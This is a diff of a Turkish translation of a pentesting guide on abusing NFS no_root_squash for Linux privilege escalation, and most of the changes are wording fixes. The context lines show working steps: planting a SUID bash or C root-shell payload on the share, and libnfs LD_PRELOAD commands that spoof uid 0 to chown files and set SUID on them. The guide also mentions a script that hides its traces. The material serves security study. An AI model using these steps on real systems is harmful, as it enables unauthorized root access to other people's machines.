@@ -5,7 +5,7 @@
 NFS genellikle (özellikle linux'ta) dosyalara erişim sağlamak için istemci tarafından belirtilen `uid` ve `gid`'ye güvenir (kerberos kullanılmıyorsa). Ancak, sunucuda bu davranışı **değiştirebilecek** bazı yapılandırmalar vardır:
 
 - **`all_squash`**: Tüm erişimleri her kullanıcı ve grubu **`nobody`** (65534 unsigned / -2 signed) olarak eşleştirerek sıkıştırır. Bu nedenle, herkes `nobody`'dir ve kullanıcı kullanılmaz.
-- **`root_squash`/`no_all_squash`**: Bu, Linux'ta varsayılandır ve **sadece uid 0 (root) ile erişimi sıkıştırır**. Bu nedenle, herhangi bir `UID` ve `GID` güvenilir, ancak `0` `nobody`'ye sıkıştırılır (bu nedenle root taklidi mümkün değildir).
+- **`root_squash`/`no_all_squash`**: Bu, Linux'ta varsayılandır ve **yalnızca uid 0 (root) ile erişimi sıkıştırır**. Bu nedenle, herhangi bir `UID` ve `GID` güvenilir, ancak `0` `nobody`'ye sıkıştırılır (bu nedenle root taklidi mümkün değildir).
 - **`no_root_squash`**: Bu yapılandırma etkinleştirildiğinde, root kullanıcısını bile sıkıştırmaz. Bu, bu yapılandırma ile bir dizini bağlarsanız, onu root olarak erişebileceğiniz anlamına gelir.
 
 **/etc/exports** dosyasında, **no_root_squash** olarak yapılandırılmış bir dizin bulursanız, o dizine **istemci olarak erişebilir** ve o dizin içinde **yerel makinenin** **root**'uymuş gibi **yazabilirsiniz**.
@@ -13,7 +13,7 @@ NFS genellikle (özellikle linux'ta) dosyalara erişim sağlamak için istemci t
 **NFS** hakkında daha fazla bilgi için kontrol edin:
 
 {{#ref}}
-/network-services-pentesting/nfs-service-pentesting.md
+../../network-services-pentesting/nfs-service-pentesting.md
 {{#endref}}
 
 # Yetki Yükseltme
@@ -37,7 +37,7 @@ cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
 Seçenek 2, c derlenmiş kod kullanarak:
-- **O dizini** bir istemci makinesine **bağlamak** ve **root olarak** bağlı klasöre SUID iznini kötüye kullanacak derlenmiş yükümüzü kopyalamak, ona **SUID** hakları vermek ve **kurban** makineden o ikiliyi çalıştırmak (burada bazı [C SUID yüklerini](payloads-to-execute.md#c) bulabilirsiniz).
+- **O dizini** bir istemci makinesine **bağlamak** ve **root olarak** bağlı klasöre SUID iznini kötüye kullanacak derlenmiş yükümüzü kopyalamak, ona **SUID** hakları vermek ve **kurban** makineden o ikili dosyayı çalıştırmak (burada bazı[C SUID yüklerini](payloads-to-execute.md#c) bulabilirsiniz).
 - Önceki gibi aynı kısıtlamalar.
 ```bash
 #Attacker, as root user
@@ -52,21 +52,21 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-## Local Exploit
+## Yerel Sömürü
 
 > [!NOTE]
-> Makinenizden kurban makinesine bir **tünel oluşturabiliyorsanız, bu ayrıcalık yükseltmesini istismar etmek için uzaktan versiyonu kullanmaya devam edebilirsiniz**.\
-> Aşağıdaki hile, dosya `/etc/exports` **bir IP gösteriyorsa** geçerlidir. Bu durumda **uzaktan istismarı kullanamayacaksınız** ve **bu hileyi istismar etmeniz gerekecek**.\
-> İstismarın çalışması için bir diğer gereklilik, **`/etc/export` içindeki dışa aktarmanın** **`insecure` bayrağını kullanmasıdır**.\
+> Makinenizden kurban makinesine bir **tünel oluşturabiliyorsanız, gerekli portları tünelleyerek bu ayrıcalık yükseltmesini sömürmek için Uzaktan sürümü kullanabilirsiniz**.\
+> Aşağıdaki hile, dosya `/etc/exports` **bir IP gösteriyorsa** geçerlidir. Bu durumda **uzaktan sömürü kullanamayacaksınız** ve **bu hileyi istismar etmeniz gerekecek**.\
+> Sömürünün çalışması için bir diğer gereklilik, **`/etc/export` içindeki dışa aktarmanın** **`insecure` bayrağını kullanmasıdır**.\
 > --_Eğer `/etc/export` bir IP adresi gösteriyorsa bu hilenin çalışıp çalışmayacağından emin değilim_--
 
-## Basic Information
+## Temel Bilgiler
 
-Senaryo, yerel bir makinede monte edilmiş bir NFS paylaşımını istismar etmeyi içeriyor ve NFSv3 spesifikasyonundaki bir açığı kullanarak istemcinin uid/gid belirtmesine olanak tanıyor, bu da yetkisiz erişimi mümkün kılabilir. İstismar, NFS RPC çağrılarını sahtelemek için bir kütüphane olan [libnfs](https://github.com/sahlberg/libnfs) kullanmayı içeriyor.
+Senaryo, yerel bir makinede monte edilmiş bir NFS paylaşımını istismar etmeyi içerir ve bu, istemcinin uid/gid'ini belirtmesine izin veren NFSv3 spesifikasyonundaki bir hatayı kullanarak yetkisiz erişim sağlama potansiyeli taşır. Sömürü, NFS RPC çağrılarını sahtelemek için bir kütüphane olan [libnfs](https://github.com/sahlberg/libnfs) kullanmayı içerir.
 
-### Compiling the Library
+### Kütüphaneyi Derleme
 
-Kütüphane derleme adımları, çekirdek sürümüne bağlı olarak ayarlamalar gerektirebilir. Bu özel durumda, fallocate sistem çağrıları yorum satırına alınmıştı. Derleme süreci aşağıdaki komutları içerir:
+Kütüphane derleme adımları, çekirdek sürümüne bağlı olarak ayarlamalar gerektirebilir. Bu özel durumda, fallocate sistem çağrıları yorum satırına alınmıştır. Derleme süreci aşağıdaki komutları içerir:
 ```bash
 ./bootstrap
 ./configure
@@ -83,7 +83,7 @@ cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
-2. **Paylaşımda istismarı yerleştirin ve uid'i sahteleyerek izinlerini değiştirin:**
+2. **Paylaşımda istismarı yerleştirin ve uid'i taklit ederek izinlerini değiştirin:**
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
@@ -97,7 +97,7 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs:/
 ```
 ## Bonus: NFShell için Gizli Dosya Erişimi
 
-Root erişimi elde edildikten sonra, sahipliği değiştirmeden NFS paylaşımı ile etkileşimde bulunmak için (iz bırakmamak için) bir Python betiği (nfsh.py) kullanılır. Bu betik, erişilen dosyanın uid'sini eşleştirerek, paylaşım üzerindeki dosyalarla izin sorunları olmadan etkileşimde bulunulmasını sağlar:
+Root erişimi elde edildikten sonra, sahipliği değiştirmeden (iz bırakmamak için) NFS paylaşımı ile etkileşimde bulunmak için bir Python betiği (nfsh.py) kullanılır. Bu betik, erişilen dosyanın uid'sini eşleştirerek, paylaşım üzerindeki dosyalarla izin sorunları olmadan etkileşimde bulunulmasını sağlar:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
